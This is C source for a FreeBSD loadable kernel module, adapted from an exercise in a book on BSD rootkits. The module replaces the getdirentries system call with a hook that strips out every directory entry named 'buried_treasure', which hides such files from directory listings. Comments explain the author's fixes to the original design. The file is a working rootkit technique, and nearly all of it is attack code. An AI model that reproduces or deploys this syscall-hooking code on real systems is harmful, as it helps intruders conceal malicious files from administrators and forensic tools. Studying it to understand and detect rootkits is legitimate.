/*
 * Based on code presented by J. Kong in
 * `Designing BSD Rootkits: An Introduction to Kernel Hacking`
 */
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/types.h>
#include <sys/malloc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <sys/dirent.h>

#define T_NAME "buried_treasure"

static int getdirentries_hook(struct thread *td, void *syscall_args)
{
    struct getdirentries_args /* {
        int fd;
        char *buf;
        u_int count;
        long *basep;
    } */ *uap;
    uap = (struct getdirentries *) syscall_args;

    struct dirent *dp;
    struct dirent *current;
    unsigned int size;
    unsigned int count;

    /* man 2 getdirentries */
    getdirentries(td, syscall_args);
    /*
     * struct thread declared sys/proc.h
     * this is the size of the directory entries returned
     */
    size = td->td_retval[0];

    /* We only need to seach for dirents to hide if there are dirents */
    if (size > 0)
    {
        /* Make a temporary buffer in kernel space to manipulate buf */
        MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
        copyin(uap->buf, dp, size);

        current = dp;
        count = size;

        /*
         * Iterate through the dirents and remove all hidden files.
         * getdirentries always a record with length 0 at the end.
         * count is used to return the number of bytes left in the buf
         * (excluding current dirent).
         */
        while ((current->d_reclen != 0) && (count > 0))
        {
            /*
             * Shorten the number of bytes left.
             * At this point, count is the number of unexamined dirents.
             * Since we are examining current in this iteration, we will
             * remove it from the count of bytes remaining.
             */
            count -= current->d_reclen;

            /*
             * Does the current record match any we wish to hide?
             * If so we will remove it from the buf of dirents
             */
            if (strcmp((char *)&(current->d_name), T_NAME) == 0)
            {
                /*
                 * Modified from Kong's design so that the size is adjusted by
                 * the record removed and /not/ by the record it is replaced
                 * with.  A subtle, yet important distinction
                 */
                size -= current->d_reclen;
                /* No sense copying data that doesn't exist */
                if (count != 0)
                {
                    /*
                     * This copies count bytes from the next record on, overtop
                     * of the current record (effectively remvoing it).
                     */
                    bcopy((char *)current + current->d_reclen, current, count);
                }
            }
            /*
             * Advance to the next record if necessary
             *
             * Another change from Kong's initial implementation.  Doesn't
             * matter much when only looking to remove a single entry, but does
             * matter when multiple are being removed.  The else prohibits
             * advancing if an entry was removed (and thus skipping items).
             */
            else if (count != 0)
            {
                current = (struct dirent *)((char *)current +
                        current->d_reclen);
            }
        }
        /* Modify our return size (or write over it with the original value) */
        td->td_retval[0] = size;
        /* Copy the data out of kernel space to user space */
        copyout(dp, uap->buf, size);

        /* Free our temporary buffer in the kernel */
        FREE(dp, M_TEMP);
    }

    return 0;
}

static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd)
    {
        case MOD_LOAD:
            sysent[SYS_getdirentries].sy_call =
                (sy_call_t *) getdirentries_hook;
            uprintf("All files named %s are hidden\n", T_NAME);
            break;
        case MOD_UNLOAD:
            sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries;
            uprintf("All files named %s are visible\n", T_NAME);
            break;
    }

    return error;
}

static moduledata_t hide_file_mod = {
    "hide_file",    /* module name */
    load,           /* event handler */
    NULL            /* No extra data */
};

DECLARE_MODULE(hide_file, hide_file_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
